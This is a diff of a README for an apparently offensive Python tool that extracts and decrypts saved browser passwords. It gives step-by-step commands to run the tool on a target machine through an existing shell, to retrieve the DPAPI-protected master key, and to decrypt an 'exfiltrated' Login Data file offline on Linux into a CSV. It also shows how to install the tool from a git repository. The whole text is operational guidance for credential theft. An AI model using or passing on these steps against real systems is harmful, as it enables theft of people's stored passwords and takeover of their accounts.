@@ -15,19 +15,25 @@ A powerful, standalone Python tool, with **Zero-Dependency** mode, designed to e
 ### On Windows (Automatic)
 If you have a shell on the target, simply run:
 ```bash
-python epd.py
+python mepd.py
 ```
 *It will automatically find the Local State, decrypt the Master Key using DPAPI, and dump all profiles.
 
 ### Offline Decryption (Linux)
 
-1. On Windows, get the hex Master Key:
+1. On Windows, get the decrypted hex Master Key:
 ```Bash
 python mepd.py --retrieve-key
 ```
-2. On Linux, use that key to decrypt an exfiltrated "Login Data" file:
+2.a On Linux, install as a package for cryptodom dep, and get mepd in your PATH
 ```Bash
-python mepd.py -d ./Login_Data -k <HEX_KEY> -o results.csv
+git clone https://github.com/0xudodelige/mepd.git
+cd mepd
+pipx install .
+```
+2.b Then use the retrieved key to decrypt an exfiltrated "Login Data" file
+```Bash
+mepd -d ./Login_Data -k <HEX_KEY> -o results.csv
 ```
 
 ## Examples
